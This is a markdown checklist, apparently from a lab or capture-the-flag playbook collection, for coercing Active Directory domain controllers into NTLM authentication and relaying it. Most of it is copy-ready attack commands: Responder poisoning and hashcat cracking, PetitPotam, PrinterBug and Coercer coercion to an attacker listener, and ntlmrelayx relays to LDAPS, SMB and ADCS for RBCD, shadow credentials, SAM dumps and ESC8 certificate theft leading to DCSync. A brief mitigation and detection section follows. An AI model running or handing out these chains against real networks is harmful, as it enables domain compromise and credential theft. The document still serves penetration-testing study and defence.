# AD Coercion & NTLM Relay Checklist

Forcing a privileged machine (usually the DC) to authenticate to you, then relaying that
authentication to a service that lacks signing/EPA. This is the backbone of unauthenticated and
low-priv AD compromise on Hard boxes. Pairs with `playbooks/runbooks/ad-decision-runbook.md`
(STATE A5 / STATE B) and `knowledge-base/mitre-attack/techniques/adcs-esc-deep.md` (ESC8/ESC11).

MITRE ATT&CK: T1187 (Forced Authentication), T1557 (Adversary-in-the-Middle).

---

## Tooling note (install first)

`responder`, `impacket`, `certipy-ad`, and `Coercer` are on Kali but **`responder` is not always
installed** in minimal/containers — flag and install if missing:

```bash
which responder || sudo apt update && sudo apt install -y responder
# Coercer (if missing):
pipx install coercer      # or: pip install coercer
# PetitPotam.py / printerbug.py: from impacket examples or the public PoC repos.
```

Set once:
```bash
export IFACE="tun0"; export ATTACKER_IP="10.10.14.X"
export TARGET="DC_IP"; export DOMAIN="domain.tld"
```

---

## Part 1 — Poisoning (passive, no target needed)

Responder answers LLMNR/NBT-NS/mDNS/WPAD name-resolution failures to capture NTLMv2.

```bash
sudo responder -I "$IFACE" -dwv
# -d analyze DHCP, -w WPAD rogue proxy, -v verbose. Hashes land in /usr/share/responder/logs/
hashcat -m 5600 /usr/share/responder/logs/*NTLMv2*.txt /usr/share/wordlists/rockyou.txt
```

**Relaying instead of cracking:** turn OFF Responder's SMB/HTTP servers first so ntlmrelayx can bind
them — edit `/etc/responder/Responder.conf` → set `SMB = Off` and `HTTP = Off`, then run
`responder -I "$IFACE" -dwv` for poisoning + `ntlmrelayx` for the relay.

---

## Part 2 — Coercion (active — force a specific host to authenticate)

Point the coerced auth at `$ATTACKER_IP` (your Responder/ntlmrelayx listener). Auth (any domain
creds) helps but several methods work unauthenticated against unpatched DCs.

### PetitPotam (MS-EFSRPC — often unauthenticated)
```bash
python3 PetitPotam.py -u USER -p PASS -d "$DOMAIN" "$ATTACKER_IP" "$TARGET"
python3 PetitPotam.py "$ATTACKER_IP" "$TARGET"        # unauth attempt (pre-patch)
```

### PrinterBug (MS-RPRN — spooler)
```bash
python3 printerbug.py "$DOMAIN"/USER:PASS@"$TARGET" "$ATTACKER_IP"
# also: dementor.py "$ATTACKER_IP" "$TARGET" -u USER -p PASS -d "$DOMAIN"
```

### Coercer (multi-protocol sweep: MS-RPRN, MS-EFSR, MS-DFSNM, MS-FSRVP…)
```bash
coercer coerce -t "$TARGET" -l "$ATTACKER_IP" -u USER -p PASS -d "$DOMAIN"
coercer scan   -t "$TARGET" -u USER -p PASS -d "$DOMAIN"     # which methods are exposed
```

### DFSCoerce (MS-DFSNM) / ShadowCoerce (MS-FSRVP)
```bash
python3 dfscoerce.py -u USER -p PASS -d "$DOMAIN" "$ATTACKER_IP" "$TARGET"
```

---

## Part 3 — Relay targets (choose by what you want)

Run the relay listener, then fire a coercion (Part 2) or wait for a poisoned hash (Part 1).
**Relaying only works where the target service lacks protection** — SMB signing OFF, LDAP signing
not enforced, HTTP without EPA. Check first: `nxc smb "$TARGET" --gen-relay-list relay_targets.txt`
(lists hosts with SMB signing disabled).

| Relayed to | Purpose | Command |
|---|---|---|
| **LDAP/LDAPS on DC** | RBCD (write `msDS-AllowedToActOnBehalfOf…`) | `impacket-ntlmrelayx -t ldaps://DC -smb2support --delegate-access` |
| **LDAP/LDAPS on DC** | Shadow credentials (add KeyCredentialLink) | `impacket-ntlmrelayx -t ldaps://DC -smb2support --shadow-credentials --shadow-target 'dc$'` |
| **LDAP on DC** | Dump domain info / add DA if privileged relayed | `impacket-ntlmrelayx -t ldap://DC --escalate-user USER` |
| **SMB on member host** | Remote command / secretsdump | `impacket-ntlmrelayx -t smb://HOST -smb2support -c 'whoami'` |
| **SMB on member host** | SAM/LSA dump | `impacket-ntlmrelayx -t smb://HOST -smb2support` (default dumps SAM) |
| **ADCS HTTP (ESC8)** | Cert as relayed machine → PKINIT → DA | `impacket-ntlmrelayx -t http://CA/certsrv/certfnsh.asp -smb2support --adcs --template DomainController` |
| **ADCS RPC (ESC11)** | Cert via RPC enrollment | `certipy relay -target 'rpc://CA'` |

### Canonical ESC8 chain (unauth → DC$ cert → DCSync)
```bash
# terminal 1 — relay DC auth to the CA web endpoint:
impacket-ntlmrelayx -t http://CA_HOST/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
# terminal 2 — coerce the DC to auth to us:
python3 PetitPotam.py "$ATTACKER_IP" "$TARGET"
# ntlmrelayx prints a base64 cert → save as dc.pfx (certipy relay does this automatically), then:
certipy auth -pfx dc.pfx -dc-ip "$TARGET"             # DC$ TGT + hash → secretsdump -just-dc
```

### Canonical RBCD chain (relay to LDAPS)
```bash
impacket-ntlmrelayx -t ldaps://DC -smb2support --delegate-access --no-dump
# coerce a computer (e.g. member) whose auth grants us delegate rights; ntlmrelayx creates a
# machine account and writes RBCD. Then impersonate:
impacket-getST -spn cifs/target.domain.tld -impersonate Administrator "$DOMAIN"/RELAYED\$:PASS -dc-ip "$TARGET"
```
Deeper RBCD flow: `playbooks/ad-rbcd-privesc.md`. Shadow-cred follow-up: `playbooks/adcs-and-shadow-creds.md`.

---

## Decision shortcuts

- Want DA fast and ADCS exists → **ESC8** relay (best win rate).
- No ADCS, SMB signing off on a host → relay to **SMB** for secretsdump.
- Need to impersonate on a computer → relay to **LDAPS** for **RBCD** or **shadow creds**.
- Only got a hash, service is protected → **crack it** (Part 1) instead of relaying.

---

## Mitigations (defensive framing for the thesis)

- **Coercion:** disable the Print Spooler on DCs (PrinterBug); patch MS-EFSRPC (PetitPotam,
  CVE-2021-36942) and filter EFSRPC; restrict RPC where feasible.
- **SMB relay:** enforce **SMB signing** everywhere (required, not just enabled) — `nxc ... --gen-relay-list`
  should return empty.
- **LDAP relay:** enforce **LDAP signing** and **LDAP channel binding** on DCs.
- **ADCS relay (ESC8/11):** require **HTTPS + EPA** on web enrollment, or disable it; set
  `IF_ENFORCEENCRYPTICERTREQUEST` for RPC enrollment.
- **Poisoning:** disable LLMNR and NBT-NS via GPO; configure legitimate WPAD; segment the network.
- **Detection:** alert on machine accounts authenticating to unusual hosts, on unexpected AD CS
  enrollment (events 4886/4887), and on new `msDS-AllowedToActOnBehalfOfOtherIdentity` writes.
